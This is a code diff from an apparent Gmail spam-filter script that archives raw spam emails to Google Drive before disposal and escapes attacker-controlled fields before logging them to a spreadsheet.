+      [logType === 'FALSE_NEGATIVE' ? 'False Negatives' : 'Detected']);
+
+    const safeTs   = new Date().toISOString().replace(/:/g, '-').replace(/\.\d+Z$/, 'Z');
+    const filename = safeTs + '_' + String(messageId).substring(0, 8) + '.eml';
+    const fileUrl  = subfolder.createFile(
+      Utilities.newBlob(rawContent, 'message/rfc822', filename)).getUrl();
+
+    result.archived = true;
+    result.driveUrl = '=HYPERLINK("' + fileUrl + '","' + filename + '")';
+  }
+  catch (e)
+  {
+    logError('Drive archive failed for ' + messageId + ': ' + e.toString());
+  }
+
+  return result;
 }
 
 /**
@@ -3733,35 +3965,22 @@ function flushSpamLog()
     {
       const entry = _pendingLogEntries[i];
 
-      // Write EML to Drive — colons are invalid in filenames, replace with dashes
-      let driveUrl = '';
-      try
-      {
-        const safeTs   = entry.detectedAt.replace(/:/g, '-').replace(/\.\d+Z$/, 'Z');
-        const filename = safeTs + '_' + entry.messageId.substring(0, 8) + '.eml';
-        const blob     = Utilities.newBlob(entry.rawContent, 'message/rfc822', filename);
-        if (entry.logType === 'FALSE_NEGATIVE')
-        {
-          if (!fnFolder) fnFolder = getOrCreateLogSubfolder(rootFolder, ['False Negatives']);
-        }
-        const folder   = entry.logType === 'FALSE_NEGATIVE' ? fnFolder : detectedFolder;
-        const fileUrl  = folder.createFile(blob).getUrl();
-        driveUrl       = '=HYPERLINK("' + fileUrl + '","' + filename + '")';
-      }
-      catch (driveError)
-      {
-        logError('Drive write failed for ' + entry.messageId + ': ' + driveError.toString());
-      }
+      // The EML was already written by archiveRawEml() BEFORE disposal, so
+      // this loop only builds the Sheets row.
+      const driveUrl = entry.driveUrl || '';
 
+      // Columns F-H and J carry attacker-controlled text; see escapeSheetCell().
+      // driveUrl is constructed by this code, not the attacker, and must stay a
+      // live =HYPERLINK formula.
       rows.push([
         entry.detectedAt,
         entry.logType,
         entry.messageId,
         entry.threadId,
         driveUrl,
-        entry.subject,
-        entry.fromDisplayName,
-        entry.fromAddress,
+        escapeSheetCell(entry.subject),
+        escapeSheetCell(entry.fromDisplayName),
+        escapeSheetCell(entry.fromAddress),
         entry.sendingDomain,
         entry.replyTo,
         entry.ruleInfo.rule,
